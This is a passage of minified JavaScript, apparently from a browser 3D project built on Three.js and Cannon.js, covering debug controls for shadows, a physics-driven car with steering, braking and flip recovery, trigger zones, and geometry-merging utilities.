t=this.debugFolder.addFolder("sun");t.open(),t.add(this.sun.position,"x").step(.01).min(-10).max(10).name("sunX").onChange(this.sun.update),t.add(this.sun.position,"y").step(.01).min(-10).max(10).name("sunY").onChange(this.sun.update),t.add(this.sun.position,"z").step(.01).min(0).max(10).name("sunZ").onChange(this.sun.update),t.add(this.sun.helper,"visible").name("sunHelperVisible")}}},{key:"setMaterials",value:function(){this.materials={},this.materials.wireframe=new qe({color:16777215,wireframe:!0}),this.materials.base=new pu,this.materials.base.depthWrite=!1,this.materials.base.uniforms.uColor.value=new Ne(this.color),this.materials.base.uniforms.uAlpha.value=0,this.materials.base.uniforms.uFadeRadius.value=.35}},{key:"setGeometry",value:function(){this.geometry=new si(1,1,1,1)}},{key:"setHelper",value:function(){var e=this;if(this.debug&&(this.helper={},this.helper.active=!1,this.helper.mesh=new Lt(new Ft(3,1,1,1),new Aa),this.helper.mesh.position.z=1.5,this.helper.mesh.position.y=-3,this.helper.mesh.visible=this.helper.active,this.container.add(this.helper.mesh),this.helper.transformControls=new fu(this.camera.instance,this.renderer.domElement),this.helper.transformControls.size=.5,this.helper.transformControls.attach(this.helper.mesh),this.helper.transformControls.visible=this.helper.active,this.helper.transformControls.enabled=this.helper.active,this.helper.shadow=this.add(this.helper.mesh,{sizeX:6,sizeY:2,offsetZ:-.35,alpha:.99}),this.helper.shadow.mesh.visible=this.helper.active,document.addEventListener("keydown",(function(t){"r"===t.key?e.helper.transformControls.setMode("rotate"):"g"===t.key&&e.helper.transformControls.setMode("translate")})),this.helper.transformControls.addEventListener("dragging-changed",(function(t){e.camera.orbitControls.enabled=!t.value})),this.container.add(this.helper.transformControls),this.debug)){var t=this.debugFolder.addFolder("helper");t.open(),t.add(this.helper,"active").name("visible").onChange((function(){e.helper.mesh.visible=e.helper.active,e.helper.transformControls.visible=e.helper.active,e.helper.transformControls.enabled=e.helper.active,e.helper.shadow.mesh.visible=e.helper.active}))}}},{key:"add",value:function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},i={};return i.offsetZ=void 0===t.offsetZ?0:t.offsetZ,i.alpha=void 0===t.alpha?1:t.alpha,i.reference=e,i.material=this.materials.base.clone(),i.mesh=new Lt(this.geometry,this.wireframeVisible?this.materials.wireframe:i.material),i.mesh.position.z=this.zFightingDistance,i.mesh.scale.set(t.sizeX,t.sizeY,2.4),this.container.add(i.mesh),this.items.push(i),i}}])&&gu(t.prototype,i),n&&gu(t,n),e}(),bu=i(1),wu=i.n(bu);function xu(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var _u=function(){function e(t){var i=this;!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.config=t.config,this.debug=t.debug,this.time=t.time,this.sizes=t.sizes,this.controls=t.controls,this.sounds=t.sounds,this.debug&&(this.debugFolder=this.debug.addFolder("physics")),this.setWorld(),this.setModels(),this.setMaterials(),this.setFloor(),this.setCar(),this.time.on("tick",(function(){i.world.step(1/60,i.time.delta,3)}))}var t,i,n;return t=e,(i=[{key:"setWorld",value:function(){this.world=new wu.a.World,this.world.gravity.set(0,0,-3.25),this.world.allowSleep=!0,this.world.defaultContactMaterial.friction=0,this.world.defaultContactMaterial.restitution=.2,this.debug&&this.debugFolder.add(this.world.gravity,"z").step(.001).min(-20).max(20).name("gravity")}},{key:"setModels",value:function(){this.models={},this.models.container=new K,this.models.container.visible=!1,this.models.materials={},this.models.materials.static=new qe({color:255,wireframe:!0}),this.models.materials.dynamic=new qe({color:16711680,wireframe:!0}),this.models.materials.dynamicSleeping=new qe({color:16776960,wireframe:!0}),this.debug&&this.debugFolder.add(this.models.container,"visible").name("modelsVisible")}},{key:"setMaterials",value:function(){this.materials={},this.materials.items={},this.materials.items.floor=new wu.a.Material("floorMaterial"),this.materials.items.dummy=new wu.a.Material("dummyMaterial"),this.materials.items.wheel=new wu.a.Material("wheelMaterial"),this.materials.contacts={},this.materials.contacts.floorDummy=new wu.a.ContactMaterial(this.materials.items.floor,this.materials.items.dummy,{friction:.05,restitution:.3,contactEquationStiffness:1e3}),this.world.addContactMaterial(this.materials.contacts.floorDummy),this.materials.contacts.dummyDummy=new wu.a.ContactMaterial(this.materials.items.dummy,this.materials.items.dummy,{friction:.5,restitution:.3,contactEquationStiffness:1e3}),this.world.addContactMaterial(this.materials.contacts.dummyDummy),this.materials.contacts.floorWheel=new wu.a.ContactMaterial(this.materials.items.floor,this.materials.items.wheel,{friction:.3,restitution:0,contactEquationStiffness:1e3}),this.world.addContactMaterial(this.materials.contacts.floorWheel)}},{key:"setFloor",value:function(){this.floor={},this.floor.body=new wu.a.Body({mass:0,shape:new wu.a.Plane,material:this.materials.items.floor}),this.world.addBody(this.floor.body)}},{key:"setCar",value:function(){var e=this;this.car={},this.car.steering=0,this.car.accelerating=0,this.car.speed=0,this.car.worldForward=new wu.a.Vec3,this.car.angle=0,this.car.forwardSpeed=0,this.car.oldPosition=new wu.a.Vec3,this.car.goingForward=!0,this.car.options={},this.car.options.chassisWidth=1.02,this.car.options.chassisHeight=1.16,this.car.options.chassisDepth=2.03,this.car.options.chassisOffset=new wu.a.Vec3(0,0,.41),this.car.options.chassisMass=20,this.car.options.wheelFrontOffsetDepth=.635,this.car.options.wheelBackOffsetDepth=-.475,this.car.options.wheelOffsetWidth=.39,this.car.options.wheelRadius=.25,this.car.options.wheelHeight=.24,this.car.options.wheelSuspensionStiffness=25,this.car.options.wheelSuspensionRestLength=.1,this.car.options.wheelFrictionSlip=5,this.car.options.wheelDampingRelaxation=1.8,this.car.options.wheelDampingCompression=1.5,this.car.options.wheelMaxSuspensionForce=1e5,this.car.options.wheelRollInfluence=.01,this.car.options.wheelMaxSuspensionTravel=.3,this.car.options.wheelCustomSlidingRotationalSpeed=-30,this.car.options.wheelMass=5,this.car.options.controlsSteeringSpeed=.005,this.car.options.controlsSteeringMax=.17*Math.PI,this.car.options.controlsSteeringQuad=!1,this.car.options.controlsAcceleratinMaxSpeed=.055,this.car.options.controlsAcceleratinMaxSpeedBoost=.11,this.car.options.controlsAcceleratingSpeed=2,this.car.options.controlsAcceleratingSpeedBoost=3.5,this.car.options.controlsAcceleratingQuad=!0,this.car.options.controlsBrakeStrength=.45,this.car.upsideDown={},this.car.upsideDown.state="watching",this.car.upsideDown.pendingTimeout=null,this.car.upsideDown.turningTimeout=null,this.car.jump=function(){var t=!(arguments.length>0&&void 0!==arguments[0])||arguments[0],i=arguments.length>1&&void 0!==arguments[1]?arguments[1]:60,n=e.car.chassis.body.position;n=n.vadd(new wu.a.Vec3(t?.08:0,0,0)),e.car.chassis.body.applyImpulse(new wu.a.Vec3(0,0,i),n)},this.car.create=function(){e.car.chassis={},e.car.chassis.shape=new wu.a.Box(new wu.a.Vec3(.5*e.car.options.chassisDepth,.5*e.car.options.chassisWidth,.5*e.car.options.chassisHeight)),e.car.chassis.body=new wu.a.Body({mass:e.car.options.chassisMass}),e.car.chassis.body.allowSleep=!1,e.car.chassis.body.position.set(0,0,12),e.car.chassis.body.sleep(),e.car.chassis.body.addShape(e.car.chassis.shape,e.car.options.chassisOffset),e.car.chassis.body.quaternion.setFromAxisAngle(new wu.a.Vec3(0,0,1),.5*-Math.PI),e.car.chassis.body.addEventListener("collide",(function(t){if(0===t.body.mass){var i=t.contact.getImpactVelocityAlongNormal();e.sounds.play("carHit",i)}})),e.car.vehicle=new wu.a.RaycastVehicle({chassisBody:e.car.chassis.body}),e.car.wheels={},e.car.wheels.options={radius:e.car.options.wheelRadius,height:e.car.options.wheelHeight,suspensionStiffness:e.car.options.wheelSuspensionStiffness,suspensionRestLength:e.car.options.wheelSuspensionRestLength,frictionSlip:e.car.options.wheelFrictionSlip,dampingRelaxation:e.car.options.wheelDampingRelaxation,dampingCompression:e.car.options.wheelDampingCompression,maxSuspensionForce:e.car.options.wheelMaxSuspensionForce,rollInfluence:e.car.options.wheelRollInfluence,maxSuspensionTravel:e.car.options.wheelMaxSuspensionTravel,customSlidingRotationalSpeed:e.car.options.wheelCustomSlidingRotationalSpeed,useCustomSlidingRotationalSpeed:!0,directionLocal:new wu.a.Vec3(0,0,-1),axleLocal:new wu.a.Vec3(0,1,0),chassisConnectionPointLocal:new wu.a.Vec3(1,1,0)},e.car.wheels.options.chassisConnectionPointLocal.set(e.car.options.wheelFrontOffsetDepth,e.car.options.wheelOffsetWidth,0),e.car.vehicle.addWheel(e.car.wheels.options),e.car.wheels.options.chassisConnectionPointLocal.set(e.car.options.wheelFrontOffsetDepth,-e.car.options.wheelOffsetWidth,0),e.car.vehicle.addWheel(e.car.wheels.options),e.car.wheels.options.chassisConnectionPointLocal.set(e.car.options.wheelBackOffsetDepth,e.car.options.wheelOffsetWidth,0),e.car.vehicle.addWheel(e.car.wheels.options),e.car.wheels.options.chassisConnectionPointLocal.set(e.car.options.wheelBackOffsetDepth,-e.car.options.wheelOffsetWidth,0),e.car.vehicle.addWheel(e.car.wheels.options),e.car.vehicle.addToWorld(e.world),e.car.wheels.indexes={},e.car.wheels.indexes.frontLeft=0,e.car.wheels.indexes.frontRight=1,e.car.wheels.indexes.backLeft=2,e.car.wheels.indexes.backRight=3,e.car.wheels.bodies=[];var t=!0,i=!1,n=void 0;try{for(var r,o=e.car.vehicle.wheelInfos[Symbol.iterator]();!(t=(r=o.next()).done);t=!0){var a=r.value,s=new wu.a.Cylinder(a.radius,a.radius,e.car.wheels.options.height,20),c=new wu.a.Body({mass:e.car.options.wheelMass,material:e.materials.items.wheel}),l=new wu.a.Quaternion;l.setFromAxisAngle(new wu.a.Vec3(1,0,0),Math.PI/2),c.type=wu.a.Body.KINEMATIC,c.addShape(s,new wu.a.Vec3,l),e.car.wheels.bodies.push(c)}}catch(e){i=!0,n=e}finally{try{t||null==o.return||o.return()}finally{if(i)throw n}}e.car.model={},e.car.model.container=new K,e.models.container.add(e.car.model.container),e.car.model.material=new qe({color:16777215,wireframe:!0}),e.car.model.chassis=new Lt(new Ft(e.car.options.chassisDepth,e.car.options.chassisWidth,e.car.options.chassisHeight),e.car.model.material),e.car.model.container.add(e.car.model.chassis),e.car.model.wheels=[];for(var h=new ma(e.car.options.wheelRadius,e.car.options.wheelRadius,e.car.options.wheelHeight,8,1),u=0;u<4;u++){var d=new Lt(h,e.car.model.material);e.car.model.container.add(d),e.car.model.wheels.push(d)}},this.car.destroy=function(){e.car.vehicle.removeFromWorld(e.world),e.models.container.remove(e.car.model.container)},this.car.recreate=function(){e.car.destroy(),e.car.create(),e.car.chassis.body.wakeUp()},this.car.brake=function(){e.car.vehicle.setBrake(1,0),e.car.vehicle.setBrake(1,1),e.car.vehicle.setBrake(1,2),e.car.vehicle.setBrake(1,3)},this.car.unbrake=function(){e.car.vehicle.setBrake(0,0),e.car.vehicle.setBrake(0,1),e.car.vehicle.setBrake(0,2),e.car.vehicle.setBrake(0,3)},this.controls.on("action",(function(t){switch(t){case"reset":e.car.recreate()}})),this.world.addEventListener("postStep",(function(){var t=new wu.a.Vec3;t=(t=t.copy(e.car.chassis.body.position)).vsub(e.car.oldPosition),e.car.oldPosition.copy(e.car.chassis.body.position),e.car.speed=t.length();var i=new wu.a.Vec3(1,0,0);e.car.chassis.body.vectorToWorldFrame(i,e.car.worldForward),e.car.angle=Math.atan2(e.car.worldForward.y,e.car.worldForward.x),e.car.forwardSpeed=e.car.worldForward.dot(t),e.car.goingForward=e.car.forwardSpeed>0;var n=new wu.a.Vec3(0,0,1),r=new wu.a.Vec3;e.car.chassis.body.vectorToWorldFrame(n,r),r.dot(n)<.5?"watching"===e.car.upsideDown.state&&(e.car.upsideDown.state="pending",e.car.upsideDown.pendingTimeout=window.setTimeout((function(){e.car.upsideDown.state="turning",e.car.jump(!0),e.car.upsideDown.turningTimeout=window.setTimeout((function(){e.car.upsideDown.state="watching"}),1e3)}),1e3)):"pending"===e.car.upsideDown.state&&(e.car.upsideDown.state="watching",window.clearTimeout(e.car.upsideDown.pendingTimeout));for(var o=0;o<e.car.vehicle.wheelInfos.length;o++){e.car.vehicle.updateWheelTransform(o);var a=e.car.vehicle.wheelInfos[o].worldTransform;if(e.car.wheels.bodies[o].position.copy(a.position),e.car.wheels.bodies[o].quaternion.copy(a.quaternion),1===o||3===o){var s=new wu.a.Quaternion(0,0,0,1);s.setFromAxisAngle(new wu.a.Vec3(0,0,1),Math.PI),e.car.wheels.bodies[o].quaternion=e.car.wheels.bodies[o].quaternion.mult(s)}}if(!e.controls.actions.up&&!e.controls.actions.down){var c=e.car.worldForward.clone();e.car.goingForward&&(c=c.negate()),c=c.scale(.1*e.car.chassis.body.velocity.length()),e.car.chassis.body.applyImpulse(c,e.car.chassis.body.position)}})),this.time.on("tick",(function(){for(var t in e.car.model.chassis.position.copy(e.car.chassis.body.position).add(e.car.options.chassisOffset),e.car.model.chassis.quaternion.copy(e.car.chassis.body.quaternion),e.car.wheels.bodies){var i=e.car.wheels.bodies[t],n=e.car.model.wheels[t];n.position.copy(i.position),n.quaternion.copy(i.quaternion)}if(e.controls.touch){var r=0;e.controls.touch.joystick.active&&(r=(r=(e.controls.touch.joystick.angle.value-e.car.angle+Math.PI)%(2*Math.PI)-Math.PI)<-Math.PI?r+2*Math.PI:r);var o=Math.abs(e.car.forwardSpeed)<.01||e.car.goingForward;e.car.steering=r*(o?-1:1),Math.abs(e.car.steering)>e.car.options.controlsSteeringMax&&(e.car.steering=Math.sign(e.car.steering)*e.car.options.controlsSteeringMax)}if(!e.controls.touch||!e.controls.touch.joystick.active){var a=e.time.delta*e.car.options.controlsSteeringSpeed;e.controls.actions.right?e.car.steering+=a:e.controls.actions.left?e.car.steering-=a:Math.abs(e.car.steering)>a?e.car.steering-=a*Math.sign(e.car.steering):e.car.steering=0,Math.abs(e.car.steering)>e.car.options.controlsSteeringMax&&(e.car.steering=Math.sign(e.car.steering)*e.car.options.controlsSteeringMax)}e.car.vehicle.setSteeringValue(-e.car.steering,e.car.wheels.indexes.frontLeft),e.car.vehicle.setSteeringValue(-e.car.steering,e.car.wheels.indexes.frontRight),e.car.options.controlsSteeringQuad&&(e.car.vehicle.setSteeringValue(e.car.steering,e.car.wheels.indexes.backLeft),e.car.vehicle.setSteeringValue(e.car.steering,e.car.wheels.indexes.backRight));var s=e.controls.actions.boost?e.car.options.controlsAcceleratingSpeedBoost:e.car.options.controlsAcceleratingSpeed,c=e.time.delta*s,l=e.controls.actions.boost?e.car.options.controlsAcceleratinMaxSpeedBoost:e.car.options.controlsAcceleratinMaxSpeed;e.controls.actions.up?e.car.speed<l||!e.car.goingForward?e.car.accelerating=c:e.car.accelerating=0:e.controls.actions.down&&(e.car.speed<l||e.car.goingForward)?e.car.accelerating=-c:e.car.accelerating=0,e.car.vehicle.applyEngineForce(-e.car.accelerating,e.car.wheels.indexes.backLeft),e.car.vehicle.applyEngineForce(-e.car.accelerating,e.car.wheels.indexes.backRight),e.car.options.controlsSteeringQuad&&(e.car.vehicle.applyEngineForce(-e.car.accelerating,e.car.wheels.indexes.frontLeft),e.car.vehicle.applyEngineForce(-e.car.accelerating,e.car.wheels.indexes.frontRight)),e.controls.actions.brake?(e.car.vehicle.setBrake(e.car.options.controlsBrakeStrength,0),e.car.vehicle.setBrake(e.car.options.controlsBrakeStrength,1),e.car.vehicle.setBrake(e.car.options.controlsBrakeStrength,2),e.car.vehicle.setBrake(e.car.options.controlsBrakeStrength,3)):(e.car.vehicle.setBrake(0,0),e.car.vehicle.setBrake(0,1),e.car.vehicle.setBrake(0,2),e.car.vehicle.setBrake(0,3))})),this.car.create(),this.debug&&(this.car.debugFolder=this.debugFolder.addFolder("car"),this.car.debugFolder.open(),this.car.debugFolder.add(this.car.options,"chassisWidth").step(.001).min(0).max(5).name("chassisWidth").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"chassisHeight").step(.001).min(0).max(5).name("chassisHeight").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"chassisDepth").step(.001).min(0).max(5).name("chassisDepth").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options.chassisOffset,"z").step(.001).min(0).max(5).name("chassisOffset").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"chassisMass").step(.001).min(0).max(1e3).name("chassisMass").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelFrontOffsetDepth").step(.001).min(0).max(5).name("wheelFrontOffsetDepth").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelBackOffsetDepth").step(.001).min(-5).max(0).name("wheelBackOffsetDepth").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelOffsetWidth").step(.001).min(0).max(5).name("wheelOffsetWidth").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelRadius").step(.001).min(0).max(2).name("wheelRadius").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelHeight").step(.001).min(0).max(2).name("wheelHeight").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelSuspensionStiffness").step(.001).min(0).max(300).name("wheelSuspensionStiffness").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelSuspensionRestLength").step(.001).min(0).max(5).name("wheelSuspensionRestLength").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelFrictionSlip").step(.001).min(0).max(30).name("wheelFrictionSlip").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelDampingRelaxation").step(.001).min(0).max(30).name("wheelDampingRelaxation").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelDampingCompression").step(.001).min(0).max(30).name("wheelDampingCompression").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelMaxSuspensionForce").step(.001).min(0).max(1e6).name("wheelMaxSuspensionForce").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelRollInfluence").step(.001).min(0).max(1).name("wheelRollInfluence").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelMaxSuspensionTravel").step(.001).min(0).max(5).name("wheelMaxSuspensionTravel").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelCustomSlidingRotationalSpeed").step(.001).min(-45).max(45).name("wheelCustomSlidingRotationalSpeed").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"wheelMass").step(.001).min(0).max(1e3).name("wheelMass").onFinishChange(this.car.recreate),this.car.debugFolder.add(this.car.options,"controlsSteeringSpeed").step(.001).min(0).max(.1).name("controlsSteeringSpeed"),this.car.debugFolder.add(this.car.options,"controlsSteeringMax").step(.001).min(0).max(.5*Math.PI).name("controlsSteeringMax"),this.car.debugFolder.add(this.car.options,"controlsSteeringQuad").name("controlsSteeringQuad"),this.car.debugFolder.add(this.car.options,"controlsAcceleratingSpeed").step(.001).min(0).max(30).name("controlsAcceleratingSpeed"),this.car.debugFolder.add(this.car.options,"controlsAcceleratingSpeedBoost").step(.001).min(0).max(30).name("controlsAcceleratingSpeedBoost"),this.car.debugFolder.add(this.car.options,"controlsAcceleratingQuad").name("controlsAcceleratingQuad"),this.car.debugFolder.add(this.car.options,"controlsBrakeStrength").step(.001).min(0).max(5).name("controlsBrakeStrength"),this.car.debugFolder.add(this.car,"recreate"),this.car.debugFolder.add(this.car,"jump"))}},{key:"addObjectFromThree",value:function(e){var t=this,i={model:{}};i.model.meshes=[],i.model.container=new K,this.models.container.add(i.model.container),i.children=[];var n=this.materials.items.dummy;if(i.body=new wu.a.Body({position:new wu.a.Vec3(e.offset.x,e.offset.y,e.offset.z),mass:e.mass,material:n}),i.body.allowSleep=!0,i.body.sleepSpeedLimit=.01,e.sleep&&i.body.sleep(),this.world.addBody(i.body),e.rotation){var r=new wu.a.Quaternion;r.setFromEuler(e.rotation.x,e.rotation.y,e.rotation.z,e.rotation.order),i.body.quaternion=i.body.quaternion.mult(r)}i.center=new wu.a.Vec3(0,0,0);for(var o=[],a=0;a<e.meshes.length;a++){var s=e.meshes[a],c=null;if(s.name.match(/^cube_?[0-9]{0,3}?|box[0-9]{0,3}?$/i)?c="box":s.name.match(/^cylinder_?[0-9]{0,3}?$/i)?c="cylinder":s.name.match(/^sphere_?[0-9]{0,3}?$/i)?c="sphere":s.name.match(/^center_?[0-9]{0,3}?$/i)&&(c="center"),"center"===c)i.center.set(s.position.x,s.position.y,s.position.z);else if(c){var l=null;if("cylinder"===c)l=new wu.a.Cylinder(s.scale.x,s.scale.x,s.scale.z,8);else if("box"===c){var h=new wu.a.Vec3(.5*s.scale.x,.5*s.scale.y,.5*s.scale.z);l=new wu.a.Box(h)}else"sphere"===c&&(l=new wu.a.Sphere(s.scale.x));var u=new wu.a.Vec3(s.position.x,s.position.y,s.position.z),d=new wu.a.Quaternion(s.quaternion.x,s.quaternion.y,s.quaternion.z,s.quaternion.w);o.push({shapeGeometry:l,shapePosition:u,shapeQuaternion:d});var p=null;"cylinder"===c?(p=new ma(1,1,1,8,1)).rotateX(.5*Math.PI):"box"===c?p=new Ft(1,1,1):"sphere"===c&&(p=new oa(1,8,8));var f=new Lt(p,this.models.materials[0===e.mass?"static":"dynamic"]);f.position.copy(s.position),f.scale.copy(s.scale),f.quaternion.copy(s.quaternion),i.model.meshes.push(f)}}var m=!0,v=!1,g=void 0;try{for(var y,b=i.model.meshes[Symbol.iterator]();!(m=(y=b.next()).done);m=!0){var w=y.value;w.position.x-=i.center.x,w.position.y-=i.center.y,w.position.z-=i.center.z,i.model.container.add(w)}}catch(e){v=!0,g=e}finally{try{m||null==b.return||b.return()}finally{if(v)throw g}}for(var x=0,_=o;x<_.length;x++){var M=_[x];M.shapePosition.x-=i.center.x,M.shapePosition.y-=i.center.y,M.shapePosition.z-=i.center.z,i.body.addShape(M.shapeGeometry,M.shapePosition,M.shapeQuaternion)}return i.body.position.x+=i.center.x,i.body.position.y+=i.center.y,i.body.position.z+=i.center.z,i.origin={},i.origin.position=i.body.position.clone(),i.origin.quaternion=i.body.quaternion.clone(),i.origin.sleep=e.sleep,this.time.on("tick",(function(){if(i.model.container.position.set(i.body.position.x,i.body.position.y,i.body.position.z),i.model.container.quaternion.set(i.body.quaternion.x,i.body.quaternion.y,i.body.quaternion.z,i.body.quaternion.w),t.models.container.visible&&e.mass>0){var n=!0,r=!1,o=void 0;try{for(var a,s=i.model.container.children[Symbol.iterator]();!(n=(a=s.next()).done);n=!0)a.value.material=2===i.body.sleepState?t.models.materials.dynamicSleeping:t.models.materials.dynamic}catch(e){r=!0,o=e}finally{try{n||null==s.return||s.return()}finally{if(r)throw o}}}})),i.reset=function(){i.body.position.copy(i.origin.position),i.body.quaternion.copy(i.origin.quaternion),i.origin.sleep&&i.body.sleep()},i}}])&&xu(t.prototype,i),n&&xu(t,n),e}();function Mu(e){return(Mu="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function Su(e,t){return!t||"object"!==Mu(t)&&"function"!=typeof t?function(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}(e):t}function Tu(e){return(Tu=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)})(e)}function Eu(e,t){return(Eu=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e})(e,t)}var Au=function(e){function t(e){var i;return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),(i=Su(this,Tu(t).call(this))).position=e.position,i.halfExtents=e.halfExtents,i.data=e.data,i.isIn=!1,i.mesh=new Lt(new Ft(2*e.halfExtents.x,2*e.halfExtents.y,3,1,1,1),new qe({color:16711935,wireframe:!0})),i.mesh.position.x=e.position.x,i.mesh.position.y=e.position.y,i.mesh.position.z=1.5,i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&Eu(e,t)}(t,e),t}(qh);function Cu(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Pu=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.time=t.time,this.sizes=t.sizes,this.physics=t.physics,this.debug=t.debug,this.container=new K,this.container.visible=!1,this.container.matrixAutoUpdate=!1,this.debug&&(this.debugFolder=this.debug.addFolder("zones"),this.debugFolder.open(),this.debugFolder.add(this.container,"visible").name("visible")),this.setTester(),this.setItems()}var t,i,n;return t=e,(i=[{key:"setTester",value:function(){var e=this;this.tester={},this.tester.x=0,this.tester.y=0,this.time.on("tick",(function(){e.tester.x=e.physics.car.chassis.body.position.x,e.tester.y=e.physics.car.chassis.body.position.y}))}},{key:"setItems",value:function(){var e=this;this.items=[],this.time.on("tick",(function(){var t=!0,i=!1,n=void 0;try{for(var r,o=e.items[Symbol.iterator]();!(t=(r=o.next()).done);t=!0){var a=r.value,s=e.tester.x<a.position.x+a.halfExtents.x&&e.tester.x>a.position.x-a.halfExtents.x&&e.tester.y<a.position.y+a.halfExtents.y&&e.tester.y>a.position.y-a.halfExtents.y;s&&!a.isIn?a.trigger("in",[a.data]):!s&&a.isIn&&a.trigger("out",[a.data]),a.isIn=s}}catch(e){i=!0,n=e}finally{try{t||null==o.return||o.return()}finally{if(i)throw n}}}))}},{key:"add",value:function(e){var t=new Au(e);return this.container.add(t.mesh),this.items.push(t),t}}])&&Cu(t.prototype,i),n&&Cu(t,n),e}(),Lu={computeTangents:function(e){var t=e.index,i=e.attributes;if(null!==t&&void 0!==i.position&&void 0!==i.normal&&void 0!==i.uv){var n=t.array,r=i.position.array,o=i.normal.array,a=i.uv.array,s=r.length/3;void 0===i.tangent&&e.addAttribute("tangent",new Xe(new Float32Array(4*s),4));for(var c=i.tangent.array,l=[],h=[],u=0;u<s;u++)l[u]=new y,h[u]=new y;var d=new y,p=new y,m=new y,v=new f,g=new f,b=new f,w=new y,x=new y,_=e.groups;0===_.length&&(_=[{start:0,count:n.length}]);u=0;for(var M=_.length;u<M;++u)for(var S=I=(O=_[u]).start,T=I+O.count;S<T;S+=3)B(n[S+0],n[S+1],n[S+2]);var E,A,C,P=new y,L=new y,R=new y,k=new y;for(u=0,M=_.length;u<M;++u){var O,I;for(S=I=(O=_[u]).start,T=I+O.count;S<T;S+=3)D(n[S+0]),D(n[S+1]),D(n[S+2])}}else console.warn("THREE.BufferGeometry: Missing required attributes (index, position, normal or uv) in BufferGeometry.computeTangents()");function B(e,t,i){d.fromArray(r,3*e),p.fromArray(r,3*t),m.fromArray(r,3*i),v.fromArray(a,2*e),g.fromArray(a,2*t),b.fromArray(a,2*i);var n=p.x-d.x,o=m.x-d.x,s=p.y-d.y,c=m.y-d.y,u=p.z-d.z,f=m.z-d.z,y=g.x-v.x,_=b.x-v.x,M=g.y-v.y,S=b.y-v.y,T=1/(y*S-_*M);w.set((S*n-M*o)*T,(S*s-M*c)*T,(S*u-M*f)*T),x.set((y*o-_*n)*T,(y*c-_*s)*T,(y*f-_*u)*T),l[e].add(w),l[t].add(w),l[i].add(w),h[e].add(x),h[t].add(x),h[i].add(x)}function D(e){R.fromArray(o,3*e),k.copy(R),A=l[e],P.copy(A),P.sub(R.multiplyScalar(R.dot(A))).normalize(),L.crossVectors(k,A),C=L.dot(h[e]),E=C<0?-1:1,c[4*e]=P.x,c[4*e+1]=P.y,c[4*e+2]=P.z,c[4*e+3]=E}},mergeBufferGeometries:function(e,t){for(var i=null!==e[0].index,n=new Set(Object.keys(e[0].attributes)),r=new Set(Object.keys(e[0].morphAttributes)),o={},a={},s=new dt,c=0,l=0;l<e.length;++l){var h=e[l];if(i!==(null!==h.index))return null;for(var u in h.attributes){if(!n.has(u))return null;void 0===o[u]&&(o[u]=[]),o[u].push(h.attributes[u])}for(var u in h.morphAttributes){if(!r.has(u))return null;void 0===a[u]&&(a[u]=[]),a[u].push(h.morphAttributes[u])}if(s.userData.mergedUserData=s.userData.mergedUserData||[],s.userData.mergedUserData.push(h.userData),t){var d;if(i)d=h.index.count;else{if(void 0===h.attributes.position)return null;d=h.attributes.position.count}s.addGroup(c,d,l),c+=d}}if(i){var p=0,f=[];for(l=0;l<e.length;++l){for(var m=e[l].index,v=0;v<m.count;++v)f.push(m.getX(v)+p);p+=e[l].attributes.position.count}s.setIndex(f)}for(var u in o){var g=this.mergeBufferAttributes(o[u]);if(!g)return null;s.addAttribute(u,g)}for(var u in a){var y=a[u][0].length;if(0===y)break;s.morphAttributes=s.morphAttributes||{},s.morphAttributes[u]=[];for(l=0;l<y;++l){var b=[];for(v=0;v<a[u].length;++v)b.push(a[u][v][l]);var w=this.mergeBufferAttributes(b);if(!w)return null;s.morphAttributes[u].push(w)}}return s},mergeBufferAttributes:function(e){for(var t,i,n,r=0,o=0;o<e.length;++o){var a=e[o];if(a.isInterleavedBufferAttribute)return null;if(void 0===t&&(t=a.array.constructor),t!==a.array.constructor)return null;if(void 0===i&&(i=a.itemSize),i!==a.itemSize)return null;if(void 0===n&&(n=a.normalized),n!==a.normalized)return null;r+=a.array.length}var s=new t(r),c=0;for(o=0;o<e.length;++o)s.set(e[o].array,c),c+=e[o].array.length;return new Xe(s,i,n)},interleaveAttributes:function(e){for(var t,i=0,n=0,r=0,o=e.length;r<o;++r){var a=e[r];if(void 0===t&&(t=a.array.constructor),t!==a.array.constructor)return console.warn("AttributeBuffers of different types cannot be 